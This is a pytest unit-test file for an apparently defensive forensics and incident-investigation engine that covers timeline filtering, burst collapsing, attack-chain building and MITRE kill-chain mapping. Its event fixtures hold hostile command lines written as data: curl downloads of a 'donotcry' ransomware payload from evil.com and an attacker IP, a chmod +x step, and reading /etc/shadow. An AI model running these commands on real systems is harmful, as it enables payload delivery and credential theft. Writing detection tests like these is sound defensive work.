"""Unit tests for the deterministic forensics engine and dual-track investigation.

Verifies timeline noise filtering, burst collapsing, attack-chain sequencing,
5-phase MITRE kill-chain collection, and zero-LLM report generation.
"""

from __future__ import annotations

from datetime import datetime, timezone
import pytest

from app.forensics import (
    AttackChainBuilder,
    AttackStage,
    DeterministicReportGenerator,
    ForensicInvestigationPackage,
    ForensicsEngine,
    KillChainCollector,
    TimelineCollapser,
)


def test_timeline_collapser_noise_filtering():
    """Verify SCA/CIS compliance sweeps and benign stat commands are filtered out."""
    collapser = TimelineCollapser()
    now = datetime(2026, 9, 14, 12, 0, 0, tzinfo=timezone.utc)

    events = [
        # Compliance noise (should be dropped)
        {
            "timestamp": now.isoformat(),
            "host": "srv01",
            "score": 5.0,
            "raw": {"rule": {"groups": ["cis", "sca"]}, "description": "CIS Ubuntu Linux benchmark check"},
        },
        # Audit sweep noise (should be dropped)
        {
            "timestamp": now.isoformat(),
            "host": "srv01",
            "score": 10.0,
            "raw": {"command_line": "stat -L /etc/passwd", "process_name": "stat"},
        },
        # Real security event (should survive)
        {
            "timestamp": now.isoformat(),
            "host": "srv01",
            "score": 85.0,
            "raw": {"command_line": "curl -O http://evil.com/donotcry", "description": "Suspicious payload download"},
        },
    ]

    timeline = collapser.build_timeline(events)
    assert len(timeline) == 1
    assert "donotcry" in timeline[0].description
    assert timeline[0].score == 85.0


def test_timeline_collapser_burst_grouping():
    """Verify repetitive periodic events collapse into a single (xN, through ...) entry."""
    collapser = TimelineCollapser()
    t0 = datetime(2026, 9, 14, 12, 0, 0, tzinfo=timezone.utc)
    t1 = datetime(2026, 9, 14, 12, 5, 0, tzinfo=timezone.utc)

    events = [
        {
            "timestamp": t0.isoformat(),
            "host": "inetfw",
            "event_type": "auth",
            "score": 20.0,
            "raw": {"description": "Failed password for root from 192.42.1.174"},
        }
    ]
    # Add 14 more identical failed passwords
    for i in range(1, 15):
        events.append(
            {
                "timestamp": t1.isoformat(),
                "host": "inetfw",
                "event_type": "auth",
                "score": 20.0,
                "raw": {"description": "Failed password for root from 192.42.1.174"},
            }
        )

    timeline = collapser.build_timeline(events)
    assert len(timeline) == 1
    assert timeline[0].count == 15
    assert "(x15" in timeline[0].description
    assert timeline[0].host == "inetfw"


def test_attack_chain_builder_sequencing():
    """Verify stages across multiple hosts are linked with directional bridges."""
    builder = AttackChainBuilder(max_chain_stages=10)

    stages = [
        AttackStage(
            host="inetfw",
            artifact="sshd_bruteforce",
            score=90.0,
            timestamp=datetime(2026, 9, 14, 10, 0, 0),
            source="detection",
        ),
        AttackStage(
            host="reposerver",
            artifact="dpkg-deb",
            score=80.0,
            timestamp=datetime(2026, 9, 14, 10, 5, 0),
            source="event",
        ),
        AttackStage(
            host="linuxshare",
            artifact="donotcry",
            score=95.0,
            timestamp=datetime(2026, 9, 14, 10, 10, 0),
            source="detection",
        ),
    ]

    chain = builder.build(stages, seed_host="inetfw")
    assert "inetfw:sshd_bruteforce" in chain
    assert "inetfw -> reposerver" in chain
    assert "reposerver:dpkg-deb" in chain
    assert "reposerver -> linuxshare" in chain
    assert "linuxshare:donotcry" in chain


def test_kill_chain_collector():
    """Verify 5-phase MITRE collection attributes vectors and extracts stages."""
    collector = KillChainCollector()

    events = [
        {
            "host": "inetfw",
            "score": 40.0,
            "raw": {"description": "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.42.1.174"},
        },
        {
            "host": "inetfw",
            "score": 40.0,
            "raw": {"description": "Failed password for invalid user admin from 192.42.1.174 port 38472 ssh2"},
        },
        {
            "host": "inetfw",
            "score": 50.0,
            "raw": {"description": "Accepted password for ubuntu from 192.42.1.174 port 38474 ssh2", "user": "ubuntu"},
        },
        {
            "host": "inetfw",
            "score": 90.0,
            "raw": {"description": "Suspicious credential access: cat /etc/shadow"},
        },
        {
            "host": "linuxshare",
            "score": 95.0,
            "raw": {"description": "ELF ransomware execution /tmp/donotcry"},
        },
    ]

    phases, stages = collector.collect(events, seed_host="inetfw")

    # Initial Access
    ia = phases["initial_access"]
    assert ia.status == "confirmed"
    assert ia.vector == "brute_force"
    assert ia.confidence >= 0.70
    assert "T1110" in ia.mitre_techniques

    # Credential Access
    ca = phases["credential_access"]
    assert ca.status == "confirmed"
    assert "T1003" in ca.mitre_techniques

    # Lateral Movement / Tool Transfer
    lm = phases["lateral_movement"]
    assert lm.status == "confirmed"
    assert "T1105" in lm.mitre_techniques

    # Stages generated
    assert len(stages) >= 2


def test_forensics_engine_end_to_end():
    """Verify ForensicsEngine produces complete package and markdown report with 0 LLM."""
    engine = ForensicsEngine()

    raw_alert = {
        "hostname": "inetfw",
        "timestamp": "2026-09-14T10:00:00Z",
        "description": "Suricata alert: ELF executable download over HTTP",
        "src_ip": "192.42.1.174",
        "dst_ip": "192.168.100.23",
        "score": 75.0,
    }

    events = [
        {
            "host": "inetfw",
            "timestamp": "2026-09-14T09:59:00Z",
            "score": 60.0,
            "raw": {"description": "Failed password for aecid from 192.42.1.174"},
        },
        {
            "host": "linuxshare",
            "timestamp": "2026-09-14T10:02:00Z",
            "score": 90.0,
            "raw": {"description": "curl -O http://192.42.1.174/donotcry && chmod +x donotcry"},
        },
    ]

    pkg = engine.analyze(
        events=events,
        incident_id="test-incident-123",
        raw_alert=raw_alert,
    )

    assert pkg.incident_id == "test-incident-123"
    assert pkg.incident_host == "inetfw"
    assert len(pkg.attack_chain) > 0
    assert len(pkg.timeline) > 0
    assert "## Initial Access (MITRE Phase 1)" in pkg.markdown_report
    assert "## Attack Chain" in pkg.markdown_report
    assert "## Forensic Timeline" in pkg.markdown_report
    assert "donotcry" in pkg.markdown_report


@pytest.mark.asyncio
async def test_forensic_agent_fallback_and_grounding():
    """Verify ForensicAgent uses deterministic ForensicsEngine package when LLM is offline."""
    from app.investigator.forensic_agent import run_forensic
    from app.investigator.state import InvestigatorState

    state = InvestigatorState(
        case_id="case-456",
        alert_summary="Brute force login followed by tool transfer",
        raw_alert={
            "hostname": "inetfw",
            "description": "Failed password for invalid user admin from 192.42.1.174",
            "score": 80.0,
        },
    )

    out = await run_forensic(state.to_dict())
    assert out["status"] == "pending"
    assert "forensic" in out
    forensic = out["forensic"]
    assert forensic["confidence"] >= 0.70
    assert len(forensic["attack_chain"]) > 0
    assert "inetfw" in forensic["attack_chain"][0]
    assert forensic["forensic_package"]["incident_host"] == "inetfw"


@pytest.mark.asyncio
async def test_report_writer_fallback_with_forensic_package():
    """Verify ReportWriterAgent incorporates deterministic forensics package in fallback report."""
    from app.forensics import ForensicsEngine
    from app.investigator.report_writer_agent import run_report_writer
    from app.investigator.state import ForensicFindings, InvestigatorState

    engine = ForensicsEngine()
    pkg = engine.analyze(
        events=[
            {"host": "inetfw", "score": 80.0, "raw": {"description": "Failed password for admin from 192.42.1.174"}},
            {"host": "linuxshare", "score": 95.0, "raw": {"description": "curl http://192.42.1.174/donotcry"}},
        ],
        incident_id="case-789",
        incident_host="inetfw",
    )

    state = InvestigatorState(
        case_id="case-789",
        alert_summary="Ransomware deployment campaign",
        forensic=ForensicFindings(
            attack_chain=pkg.attack_chain,
            kill_chain_phases={k: v.to_dict() for k, v in pkg.kill_chain_phases.items()},
            forensic_package=pkg.to_dict(),
            summary="Forensic analysis complete.",
        ),
    )

    out = await run_report_writer(state.to_dict())
    assert out["status"] == "completed"
    report_md = out["report_md"]
    assert "## Initial Access (MITRE Phase 1)" in report_md
    assert "## Attack Chain" in report_md
    assert "donotcry" in report_md


